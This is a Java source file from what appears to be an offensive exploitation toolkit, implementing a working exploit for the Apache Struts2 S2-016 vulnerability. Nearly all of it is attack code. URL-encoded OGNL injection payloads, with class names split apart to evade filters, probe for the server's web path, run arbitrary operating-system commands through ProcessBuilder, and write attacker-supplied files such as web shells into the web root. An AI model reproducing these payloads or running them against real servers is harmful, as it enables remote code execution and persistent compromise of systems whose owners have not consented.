package fun.fireline.exp.apache.struts2;

import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.HttpTool;

import java.net.URLEncoder;
import java.util.UUID;

/**
 * @author yhy
 * @date 2021/8/17 13:57
 * @github https://github.com/yhy0
 */

public class S2_016 implements ExploitInterface {

    private String target = null;
    private boolean isVul = false;

    private String payload = "redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27GB2312%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22path8888997:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()}";

    private String webPath;
    @Override
    public boolean checkVul(String url) {
        this.target = url;
        try {
            String result = HttpTool.postHttpReuest(this.target, "application/x-www-form-urlencoded", this.payload, "UTF-8");
            boolean flag = result.contains("webpath8888997");
            if(flag) {
                this.isVul = true;
                this.webPath = result.replace("webpath8888997:", "");
            }
            return flag;
        } catch (Exception e) {
            logger.error(e);
        }
        return false;
    }

    @Override
    public String exeCmd(String cmd, String encoding) {
        try {
            String cmd_payload = "redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27payload%27.toString().split(%27\\\\s%27))).start().getInputStream()).useDelimiter(%27\\\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27encoding%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()}";

            String data = cmd_payload.replace("payload", cmd).replace("encoding", encoding);
            String result = HttpTool.postHttpReuest(this.target, "application/x-www-form-urlencoded", data, encoding);
            return result;

        } catch (Exception e) {
            logger.error(e);
        }
        return "fail";
    }

    @Override
    public String getWebPath() {
        try {
           return this.webPath;
        } catch (Exception e) {
            logger.error(e);
        }
        return "命令执行失败";
    }

    @Override
    public String uploadFile(String fileContent, String filename, String platform) throws Exception {

        fileContent = URLEncoder.encode(fileContent, "UTF-8" );

        String payload = "redirect:${%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23res%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23res.getWriter().print(%22Ok0%22),%23res.getWriter().print(%22Kok%22),%23res.getWriter().flush(),%23res.getWriter().close(),%23p%3d(%23req.getRealPath(%22%2F%22)%2b%22PATH%22).replaceAll(%22\\\\\\\\%22, %22/%22),new+java.io.BufferedWriter(new+java.io.FileWriter(%23p)).append(%23req.getParameter(%22c%22)).close()}&c=SHELL";

        payload = payload.replace("PATH", filename).replace("SHELL", fileContent);

        String result = HttpTool.postHttpReuest(this.target, "application/x-www-form-urlencoded", payload, "UTF-8");

        if(result.contains("Ok0Kok")) {
            result = result + "  上传成功! ";
        } else {
            result =  "上传失败";
        }

        return result;

    }

    @Override
    public boolean isVul() {
        return this.isVul;
    }
}
